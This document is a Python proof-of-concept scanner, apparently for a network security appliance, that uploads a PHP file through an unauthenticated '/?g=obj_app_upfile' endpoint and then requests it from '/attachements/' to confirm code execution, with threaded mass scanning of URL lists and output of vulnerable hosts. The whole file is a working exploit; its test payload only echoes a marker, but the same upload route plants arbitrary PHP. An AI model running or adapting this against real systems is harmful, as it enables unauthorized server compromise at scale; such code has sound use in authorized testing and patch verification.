import os
import time
from urllib import response
from urllib.parse import urljoin
from weakref import proxy
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser

requests.packages.urllib3.disable_warnings()


class POC:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()

        if self.args.file:
            self.init()
            self.urlList = self.loadURL()
            self.multiRun()
            self.start = time.time()
        else:
            self.verfyurl()

    def banner(self):
        logo = r"""
             _ _____           _____ _____ _      _____  ____ _____        _____      _  ______             
    (_)  ___|         /  ___/  ___| |    |____ |/ ___|  _  |      /  ___|    | | | ___ \            
     _\ `--.  ___  ___\ `--.\ `--.| |        / / /___| |/' |______\ `--.  ___| |_| |_/ /_ _ ___ ___ 
    | |`--. \/ _ \/ __|`--. \`--. \ |        \ \ ___ \  /| |______|`--. \/ _ \ __|  __/ _` / __/ __|
    | /\__/ /  __/ (__/\__/ /\__/ / |____.___/ / \_/ \ |_/ /      /\__/ /  __/ |_| | | (_| \__ \__ \
    |_\____/ \___|\___\____/\____/\_____/\____/\_____/\___/       \____/ \___|\__\_|  \__,_|___/___/                                                                                    
        """
        print("\033[91m" + logo + "\033[0m")

    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-u", "--url", required=False, type=str, help="Target url(e.g. http://127.0.0.1)")
        parser.add_argument("-f", "--file", required=False, type=str, help=f"Target file(e.g. url.txt)")
        parser.add_argument("-t", "--thread", required=False, type=int, default=5, help=f"Number of thread (default 5)")
        parser.add_argument("-T", "--timeout", required=False, type=int, default=60, help="Request timeout (default 3)")
        parser.add_argument("-o", "--output", required=False, type=str, default=date,
                            help=f"Vuln url output file (e.g. result.txt)")
        parser.add_argument("-p", "--proxy", default=None, help="Request Proxy (e.g http://127.0.0.1:8080)")
        return parser.parse_args()

    def proxy_server(self):
        proxy = self.args.proxy
        return proxy

    def init(self):
        print("\nthread:", self.args.thread)  # 线程
        print("timeout:", self.args.timeout)  # 超时
        msg = ""
        if os.path.isfile(self.args.file):
            msg += "Load url file successfully\n"
        else:
            msg += f"\033[31mLoad url file {self.args.file} failed\033[0m\n"
        print(msg)
        if "failed" in msg:
            print("Init failed, Please check the environment.")
            os._exit(0)
        print("Init successfully")

    def respose(self, url):
        proxy = self.args.proxy  # 代理
        proxies = None
        if proxy:
            proxies = {"http": proxy, "https": proxy}
        path = "/?g=obj_app_upfile"  # 上传路径
        url = urljoin(url, path)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Content-Type": "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae"
        }
        data = '--502f67681799b07e4de6b503655f5cae\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n10000000\r\n--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name="upfile"; filename="vulntest.php"\r\nContent-Type: text/plain\r\n\r\n<?php echo base64_decode("ZTE2NTQyMTExMGJhMDMwOTlhMzAzOTMzNzNjNWI0Mw==");?>\r\n\r\n--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name="submit_post"\r\n\r\nobj_app_upfile\r\n--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name="__hash__"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n--502f67681799b07e4de6b503655f5cae--'
        try:
            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=self.args.timeout,
                                     verify=False)
            path2 = "/attachements/vulntest.php"
            header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            }
            resurl = urljoin(url, path2)
            response2 = requests.get(resurl, headers=header, proxies=proxies, timeout=self.args.timeout, verify=False)
            resp = response2.text
            return resp
        except:
            return "conn"

    def verfyurl(self):
        url = self.args.url
        repData = self.respose(url)
        if "e165421110ba03099a30393373c5b43" in repData:
            print("[+] 漏洞存在！！！[✅] url: {}".format(url))
        elif "conn" in repData:
            print("[-] URL连接失败！ [-] url: {}".format(url))
        else:
            print("[x] 未检测到漏洞！[x] url: {}".format(url))

    def verify(self, url):
        repData = self.respose(url)
        if "e165421110ba03099a30393373c5b43" in repData:
            msg = "[+] 漏洞存在！！！[✅] url: {}".format(url)
            self.lock.acquire()
            try:
                self.findCount += 1
                self.vulnRULList.append(url)
            finally:
                self.lock.release()
        elif "conn" in repData:
            msg = "[-] URL连接失败！ [-] url: {}".format(url)
        else:
            msg = "[x] 未检测到漏洞！[x] url: {}".format(url)
        self.lock.acquire()
        try:
            print(msg)
        finally:
            self.lock.release()

    def loadURL(self):
        urlList = []
        with open(self.args.file, encoding="utf8") as f:
            for u in f.readlines():
                u = u.strip()
                urlList.append(u)
        return urlList

    def multiRun(self):
        self.findCount = 0  # 有效url数
        self.vulnRULList = []  # 有效元组
        self.lock = Lock()
        executor = ThreadPoolExecutor(max_workers=self.args.thread)
        if self.args.url:
            executor.map(self.verify, self.url)
        else:
            executor.map(self.verify, self.urlList)

    def output(self):
        if not os.path.isdir(r"./output"):
            os.mkdir(r"./output")
        self.outputFile = f"./output/{self.args.output}.txt"
        with open(self.outputFile, "a") as f:
            for url in self.vulnRULList:
                f.write(url + "\n")

    def __del__(self):
        try:
            print("\nAlltCount：\033[31m%d\033[0m\nVulnCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe vulnURL has been saved in {self.outputFile}\n")
        except:
            pass


if __name__ == "__main__":
    POC()
